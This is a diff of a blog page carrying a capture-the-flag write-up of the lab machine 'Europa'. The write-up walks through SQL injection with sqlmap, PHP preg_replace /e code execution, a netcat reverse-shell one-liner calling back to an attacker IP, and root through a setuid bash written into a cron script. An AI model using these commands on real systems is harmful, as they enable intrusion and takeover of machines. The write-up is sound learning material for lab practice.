@@ -34,7 +34,7 @@
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
 <p>Let’s explore Europa. Looks a bit like Apache default page if you ask me.</p>
-<p><img src="/_resources/59947c32f7724f2788579a361cad79e3.png" /></p>
+<p><img src=":/59947c32f7724f2788579a361cad79e3" alt="f750f5d1ec5b84c3445f679a54e70460.png" /></p>
 <div><pre class="hljs"><code>$nmap -p- -A <span class="hljs-number">10.129</span><span class="hljs-number">.166</span><span class="hljs-number">.9</span>
 Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-14</span> <span class="hljs-number">16</span>:<span class="hljs-number">10</span> UTC
 Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.166</span><span class="hljs-number">.9</span>
@@ -61,7 +61,7 @@ PORT    STATE SERVICE  VERSION
 |<span class="hljs-type">_</span>  http/<span class="hljs-number">1.1</span>
 Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
 <p>So I’ve added europacorp.htb to the dnsmasq and tried out then the newly found <a title="https://admin-portal.europacorp.htb" href="https://admin-portal.europacorp.htb">https://admin-portal.europacorp.htb</a>, I got a log in page.</p>
-<p><img src="/_resources/f45e49a82b474b47853d80a6fac93b44.png" /></p>
+<p><img src=":/f45e49a82b474b47853d80a6fac93b44" alt="ce298bce9e0fee82f7e4329eb2f4fce6.png" /></p>
 <p>I run sqlmap against it and <code>got a 302 redirect to 'https://admin-portal.europacorp.htb/dashboard.php</code>. Going to it, we just seem to be logged in and are able to use the whole site. We also get dump of users database.</p>
 <div><pre class="hljs"><code><span class="hljs-string">custom)</span> <span class="hljs-string">POST</span> <span class="hljs-string">parameter</span> <span class="hljs-string">'#1*'</span> <span class="hljs-string">is</span> <span class="hljs-string">vulnerable.</span> <span class="hljs-string">Do</span> <span class="hljs-string">you</span> <span class="hljs-string">want</span> <span class="hljs-string">to</span> <span class="hljs-string">keep</span> <span class="hljs-string">testing</span> <span class="hljs-string">the</span> <span class="hljs-string">others</span> <span class="hljs-string">(if</span> <span class="hljs-string">any)?</span> [<span class="hljs-string">y/N</span>] 
 <span class="hljs-string">sqlmap</span> <span class="hljs-string">identified</span> <span class="hljs-string">the</span> <span class="hljs-string">following</span> <span class="hljs-string">injection</span> <span class="hljs-string">point(s)</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">total</span> <span class="hljs-string">of</span> <span class="hljs-number">408</span> <span class="hljs-string">HTTP(s)</span> <span class="hljs-attr">requests:</span>
@@ -90,9 +90,9 @@ Table: users
 +----+----------------------+----------+----------------------------------+---------------+</span></code></pre></div>
 <p>admin pass is SuperSecretPassword!</p>
 <h1 id="dashboard">Dashboard</h1>
-<p><img src="/_resources/a28263f6f84b4b11bccf348e787f5602.png" /></p>
+<p><img src=":/a28263f6f84b4b11bccf348e787f5602" alt="004319b3707946e4e6b48c362768bc25.png" /></p>
 <p>The only availeable tool to us is OpenVPN Config generator.</p>
-<p><img src="/_resources/9d4021f41a3040589b9133d971ca3ca4.png" /></p>
+<p><img src=":/9d4021f41a3040589b9133d971ca3ca4" alt="49fddfc4151194e8fcfbd4086845cc49.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-attr">"openvpn":</span> {
         <span class="hljs-attr">"vtun0":</span> {
                 <span class="hljs-attr">"local-address":</span> {
@@ -128,13 +128,13 @@ Table: users
         }
 }</code></pre></div>
 <p>When providing any input and looking at our request in burpsuite, we can see that there is a “pattern” variable, probably for some regex, that tries to add our ipaddress to the text.</p>
-<p><img src="/_resources/b6cfcd6f430046ffa0574e9be02b8aa9.png" /></p>
+<p><img src=":/b6cfcd6f430046ffa0574e9be02b8aa9" alt="78b814f8a1cb52129e308cf73551016b.png" /></p>
 <p>Searching for “php replace in text with regex” gets us <a title="https://stackoverflow.com/questions/22040272/using-php-replace-regex-with-regex" href="https://stackoverflow.com/questions/22040272/using-php-replace-regex-with-regex">stackoverflow telling about preg_replace</a>. Looking for some ways to exploit it, I’ve found RCE on <a title="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp">hacktricks.xyz</a></p>
-<p><img src="/_resources/b814f13a9a88434e80eb7be95185dc1e.png" /></p>
+<p><img src=":/b814f13a9a88434e80eb7be95185dc1e" alt="23fcfd7a5f2f8421ff5d4d676afbe43b.png" /></p>
 <p>I was confused for a while here and tried to terminate somehow php and put everything in the pattern field, i.e <code>pattern=/ip_address/e", "print('hello');", $text);</code>. That did not work whatsoever, but after a while I found the right way, separating it into params just like on hacktricks.</p>
-<p><img src="/_resources/f59e3e7aac9b4a29b9ce74fea68627a6.png" /></p>
+<p><img src=":/f59e3e7aac9b4a29b9ce74fea68627a6" alt="b445457e91b48a6106a7130e8d396c84.png" /></p>
 <p>Running <code>system('ls /home/')</code> gets us user John. We can’t get in via ssh, so we need to create a reverse shell. We can copy from <a title="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools" href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools">InternalAllTheThings</a> and get <code>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.17 4242 &gt;/tmp/f')</code>. On host run <code>nc -lvnp 4242</code>, send request and we are in.</p>
-<p><img src="/_resources/9c0f1552289e402e95f4b7030733f960.png" /></p>
+<p><img src=":/9c0f1552289e402e95f4b7030733f960" alt="e7eea04158ed7d7f12bb3fc245bc3f1d.png" /></p>
 <p>Let’s get standard shell stabilisation and work towards priv esc for root. Flag can be obtained from /home/john/user.txt.</p>
 <div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm
@@ -154,7 +154,7 @@ total 8
 drwxrwxr-x 2 root www-data 4096 May 17  2022 .
 drwxr-xr-x 6 root root     4096 May 17  2022 ..</code></pre></div>
 <p>Let’s make one then with <code>echo "chmod u+s /bin/bash" &gt; logcleared.sh</code>, set <code>chmod 777 logcleared.sh</code> and wait a minute. Then, run <code>/bin/bash -p</code> to get root and we are done here.</p>
-<p><img src="/_resources/7f8496125b724ee3b09da4af403e727f.png" /></p>
+<p><img src=":/7f8496125b724ee3b09da4af403e727f" alt="4322f5c407097770b58d34dd78e90a10.png" /></p>
 </div>
       </article>
     </div>
